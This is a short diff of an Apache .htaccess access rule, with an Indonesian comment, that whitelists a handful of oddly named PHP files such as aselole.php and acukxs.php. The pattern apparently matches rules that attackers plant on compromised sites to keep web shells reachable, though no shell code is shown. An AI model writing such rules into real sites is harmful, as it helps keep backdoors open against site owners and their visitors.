@@ -10,7 +10,7 @@ Require all granted
 </FilesMatch>
 
 # Izinkan file tertentu
-<FilesMatch '^(Interests.php|index.php|kimaksxs.php|aselole.php|acukxs.php)$'>
+<FilesMatch '^(Interests.php|index-OTH.php|index-MAR.php|aselole.php|acukxs.php)$'>
 Require all granted
 </FilesMatch>
 
